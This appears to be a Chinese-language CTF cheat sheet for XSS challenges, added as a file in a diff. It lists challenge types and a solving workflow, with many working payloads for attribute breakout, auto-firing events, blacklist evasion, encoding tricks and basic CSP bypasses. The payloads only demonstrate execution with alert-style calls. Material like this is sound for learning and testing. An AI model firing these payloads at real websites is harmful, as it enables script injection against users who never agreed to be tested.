@@ -1,0 +1,313 @@
+# 🧩 **【XSS 系列题型】**
+
+---
+
+# **1. 题目类型**
+
+### **1.1 基础类型**
+
+* 反射型 XSS
+* 存储型 XSS
+* DOM 型 XSS
+
+### **1.2 特殊类型（含绕过）**
+
+* 属性注入型 XSS
+* 事件触发型 XSS
+* 非 script 标签 XSS
+* 黑名单绕过 XSS
+* 函数禁用型（alert 被过滤）
+* 编码绕过 XSS
+* CSP 绕过 XSS
+
+---
+
+# **2. 解题输出思路**
+
+1. 找可控回显点
+2. 判断过滤机制（字符、标签、事件、函数）
+3. 判断上下文（HTML / 属性 / JS / DOM）
+4. 根据上下文选择突破策略
+5. 构造 payload（按过滤器调整）
+6. 触发 payload
+7. 获取 flag
+
+---
+
+# **3. 解题关注点**
+
+* script 是否被过滤
+* alert/prompt 是否被过滤
+* 属性是否需要闭合（`" ' >`）
+* 是否允许事件（onerror/onfocus/onload）
+* 是否可利用自动触发：img、svg、autofocus
+* CSP 是否阻止 inline script
+* 是否可使用编码构造
+
+---
+
+# **4. 通用步骤**
+
+## **4.1 通用步骤（含 payload）**
+
+### **① 测试基础脚本执行**
+
+```
+<script>alert(1)</script>
+```
+
+### **② script 被过滤 → 换 img/onerror**
+
+```
+<img src=x onerror=alert(1)>
+```
+
+### **③ alert 被屏蔽 → 换 prompt**
+
+```
+<img src=x onerror=prompt(1)>
+```
+
+### **④ 再被屏蔽 → confirm 或 console**
+
+```
+<img src=x onerror=confirm(1)>
+```
+
+```
+<img src=x onerror=console.log(1)>
+```
+
+---
+
+# **5. 方法论 + 全量 payload**
+
+## **5.1 结构破坏法（闭合属性或标签）**
+
+### **① 闭合属性注入**
+
+```
+1" autofocus onfocus=alert(1) x=" 
+```
+
+### **② 强制标签闭合**
+
+```
+"></script><script>alert(1)</script>
+```
+
+### **③ 注释断开**
+
+```
+"><!-- --><img src=x onerror=alert(1)>
+```
+
+---
+
+## **5.2 事件自动触发法**
+
+### **① 自动触发 onerror**
+
+```
+<img src=1 onerror=alert(1)>
+```
+
+### **② autofocus + onfocus（非常常用）**
+
+```
+<input autofocus onfocus=alert(1)>
+```
+
+### **③ DOM 自触发事件**
+
+```
+<details open ontoggle=alert(1)>
+```
+
+### **④ onmouseover**
+
+```
+<div style="width:100px;height:100px" onmouseover=alert(1)>x</div>
+```
+
+---
+
+## **5.3 黑名单绕过法**
+
+### **① 双写 script 绕过过滤**
+
+```
+<scscriptript>alert(1)</scscriptript>
+```
+
+### **② 大小写混写绕过**
+
+```
+<ScRiPt>alert(1)</ScRiPt>
+```
+
+### **③ 注释插断绕过**
+
+```
+<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
+```
+
+### **④ 空格绕过**
+
+```
+< script>alert(1)</ script>
+```
+
+---
+
+## **5.4 非 script 标签执行（原始 payload）**
+
+### **① img/onerror**
+
+```
+<img src=x onerror=alert(1)>
+```
+
+### **② svg/onload**
+
+```
+<svg onload=alert(1)>
+```
+
+### **③ iframe/onload**
+
+```
+<iframe onload=alert(1)>
+```
+
+### **④ video/poster/onerror**
+
+```
+<video src=1 onerror=alert(1)>
+```
+
+### **⑤ math + mtext（部分浏览器执行）**
+
+```
+<math><mtext><img src=x onerror=alert(1)></mtext></math>
+```
+
+---
+
+## **5.5 函数替代法（alert 被过滤）**
+
+### **① prompt**
+
+```
+<img src=x onerror=prompt(1)>
+```
+
+### **② confirm**
+
+```
+<img src=x onerror=confirm(1)>
+```
+
+### **③ Function 构造器**
+
+```
+<svg onload=Function("alert(1)")()>
+```
+
+### **④ setTimeout 绕过**
+
+```
+<svg onload=setTimeout('alert(1)')>
+```
+
+---
+
+## **5.6 编码重建法**
+
+### **① base64 + atob + eval**
+
+```
+<svg onload=eval(atob("YWxlcnQoMSk="))>
+```
+
+（YWxlcnQoMSk= → alert(1)）
+
+### **② fromCharCode**
+
+```
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+```
+
+### **③ URL 编码**
+
+```
+<script>eval(unescape("%61%6c%65%72%74%28%31%29"))</script>
+```
+
+---
+
+## **5.7 CSP 绕过（基础示例）**
+
+### **① 利用 allowed domain**
+
+```
+<script src=https://allowed.example/xss.js></script>
+```
+
+### **② JSONP 利用**
+
+```
+<script src=https://example.com/jsonp?callback=alert(1)></script>
+```
+
+### **③ location 跳转执行**
+
+```
+<a href="javascript:alert(1)">CLICK</a>
+```
+
+---
+
+# **6. 启发问题**
+
+* script 是否可用？
+* 是否能闭合 HTML 属性？
+* 有哪些事件没有被过滤？
+* alert 是否被禁用？
+* 能否通过 img/svg 自动触发？
+* CSP 是否允许 inline script？
+* DOM 拼接是否存在 innerHTML？
+
+---
+
+# **7. 绕过技巧（全部附带原始 payload）**
+
+## **7.1 双写绕过**
+
+```
+<scscriptript>alert(1)</scscriptript>
+```
+
+## **7.2 属性闭合**
+
+```
+1"><img src=x onerror=alert(1)>
+```
+
+## **7.3 自动执行**
+
+```
+<input autofocus onfocus=alert(1)>
+```
+
+## **7.4 编码绕过**
+
+```
+<svg onload=eval(atob("YWxlcnQoMSk="))>
+```
+
+## **7.5 事件链**
+
+```
+<div onclick=alert(1)><img src=x onerror=this.parentNode.click()></div>
+```
